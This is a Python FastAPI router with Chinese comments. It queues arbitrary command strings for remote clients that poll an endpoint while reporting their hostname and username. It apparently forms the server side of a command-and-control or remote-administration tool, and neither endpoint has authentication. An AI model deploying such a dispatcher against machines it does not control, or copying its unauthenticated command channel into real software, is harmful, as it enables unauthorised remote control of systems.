from fastapi import APIRouter
from routers.clients import command_queue
from routers.client_registry import update_client_status

router = APIRouter()

@router.get("/next_command")
def get_next_command(client_id: str, hostname: str = None, username: str = None):
    # client_id 現在是 stable_id
    stable_id = client_id
    
    # 更新客戶端狀態（如果提供了環境資訊）
    if hostname and username:
        stable_id = update_client_status(client_id, hostname, username)
        print(f"Client {stable_id} ({hostname}\\{username}) checking for commands")
    else:
        print(f"Client {stable_id} checking for commands")
    
    if stable_id not in command_queue:
        # 自動註冊新的 stable_id
        command_queue[stable_id] = None
        print(f"Auto-registered stable ID: {stable_id}")
    
    command = command_queue[stable_id]
    if command:
        # 清除已發送的指令
        command_queue[stable_id] = None
        print(f"Sending command to {stable_id}: {command}")
        return {"command": command}
    
    return {"command": None}

@router.post("/send_command")
def send_command(client_id: str, command: str):
    # client_id 現在是 stable_id
    stable_id = client_id
    
    if stable_id not in command_queue:
        # 自動註冊新的 stable_id
        command_queue[stable_id] = None
        
    command_queue[stable_id] = command
    return {"status": f"Command queued for {stable_id}"}